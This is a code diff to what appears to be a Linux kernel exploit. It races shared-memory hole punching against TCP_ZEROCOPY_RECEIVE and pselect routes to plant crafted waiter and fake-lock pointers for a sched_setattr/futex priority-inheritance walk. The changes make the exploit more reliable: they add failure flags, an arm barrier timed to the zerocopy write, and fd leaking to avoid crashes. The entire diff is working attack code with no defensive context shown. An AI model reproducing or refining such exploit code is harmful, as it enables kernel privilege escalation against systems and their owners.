@@ -29,6 +29,8 @@ struct tcp_punch_state {
 static atomic_int tcp_punch_go;
 static atomic_int tcp_punch_stop;
 static atomic_int tcp_punch_phase;
+/* errno of the first puncher fallocate that failed; 0 while healthy */
+static atomic_int tcp_punch_failed;
 
 static void tcp_wait_for_consumer_idle(void) {
   atomic_store(&punch_consume_go, 0);
@@ -101,6 +103,7 @@ static void *tcp_punch_thread(void *arg) {
   }
   while (!atomic_load(&tcp_punch_stop)) {
     if (fallocate(state->fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
+      atomic_store(&tcp_punch_failed, errno ? errno : EIO);
       pr_warning("tcp punch fill errno=%d\n", errno);
       break;
     }
@@ -108,9 +111,15 @@ static void *tcp_punch_thread(void *arg) {
     if (fallocate(state->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                   (off_t)state->page_size,
                   TCP_PUNCH_SHMEM_LEN - state->page_size) != 0) {
+      /* without the hole the target page keeps its stale contents and the
+       * zerocopy write no longer lands as zeros */
+      atomic_store(&tcp_punch_failed, errno ? errno : EIO);
       pr_warning("tcp punch hole errno=%d\n", errno);
     }
     atomic_store(&tcp_punch_phase, 0);
+    if (atomic_load(&tcp_punch_failed)) {
+      break;
+    }
   }
   return NULL;
 }
@@ -164,6 +173,7 @@ void do_tcp_fake_lock_route(void) {
   /* clear before the thread can start */
   atomic_store(&tcp_punch_stop, 0);
   atomic_store(&tcp_punch_phase, 0);
+  atomic_store(&tcp_punch_failed, 0);
   atomic_store(&punch_consume_stop, 0);
   atomic_store(&punch_consume_go, 0);
   atomic_store(&consumer_calls, 0);
@@ -202,9 +212,17 @@ void do_tcp_fake_lock_route(void) {
     while (atomic_load(&tcp_punch_phase)) {
       sched_yield();
     }
-    for (int spin = 0; !atomic_load(&tcp_punch_phase) && spin < 10000000;
+    for (int spin = 0;
+         !atomic_load(&tcp_punch_phase) && !atomic_load(&tcp_punch_failed) &&
+         spin < 10000000;
          spin++) {
       __asm__ volatile("yield" ::: "memory");
+    }
+    if (atomic_load(&tcp_punch_failed)) {
+      route_last_step = 46;
+      route_last_errno = atomic_load(&tcp_punch_failed);
+      pr_error("tcp route puncher failed errno=%d\n", route_last_errno);
+      break;
     }
 
     unsigned char zc[0x40];
@@ -214,15 +232,16 @@ void do_tcp_fake_lock_route(void) {
     put64(zc, 0x28, waiter_task);
     put64(zc, 0x30, fake_lock);
 
-    if (i >= arm_seq) {
-      atomic_store(&punch_consume_go, i);
-    }
     socklen_t len = sizeof(zc);
     errno = 0;
     int ret = getsockopt(client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, zc,
                          &len);
     int saved_errno = errno;
-    if (i >= arm_seq) {
+    /* Arm barrier: release the consumer only once the zerocopy write has
+     * landed in the waiter frame. Releasing earlier lets sched_setattr walk
+     * a half-written waiter and the attempt misses. */
+    if (i >= arm_seq && ret == 0) {
+      atomic_store(&punch_consume_go, i);
       for (int spin = 0; spin < post_hold; spin++) {
         __asm__ volatile("yield" ::: "memory");
       }
@@ -517,10 +536,12 @@ void do_pselect_fake_lock_route(void) {
    * wait for it to finish before tearing the fds down. The PI walk runs on
    * the consumer's CPU and we must not close/reclaim the block fds while it
    * still holds the crafted waiter on the stack. */
+  int consumer_stuck = 0;
   if (atomic_load(&consumer_inflight) != 0) {
     for (int i = 0; i < 2000 && atomic_load(&consumer_inflight) != 0; i++) {
       usleep(1000);
     }
+    consumer_stuck = atomic_load(&consumer_inflight) != 0;
   }
 
   calls = atomic_load(&consumer_calls);
@@ -537,11 +558,19 @@ void do_pselect_fake_lock_route(void) {
   }
 
   /* open_selected_fds only closes its own F_DUPFD copy */
-  if (block_fd != pipefd[0]) {
-    close(block_fd);
+  if (consumer_stuck) {
+    /* The consumer never came back from sched_setattr/futex. Closing would
+     * reclaim pipe objects its in-flight syscall still references, so leak
+     * them instead and let process exit reclaim. */
+    route_last_step = 34;
+    pr_error("pselect consumer still inflight; leaking route fds\n");
+  } else {
+    if (block_fd != pipefd[0]) {
+      close(block_fd);
+    }
+    close(pipefd[0]);
+    close(pipefd[1]);
   }
-  close(pipefd[0]);
-  close(pipefd[1]);
 
   pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
           calls, success, route_last_step, route_last_errno);
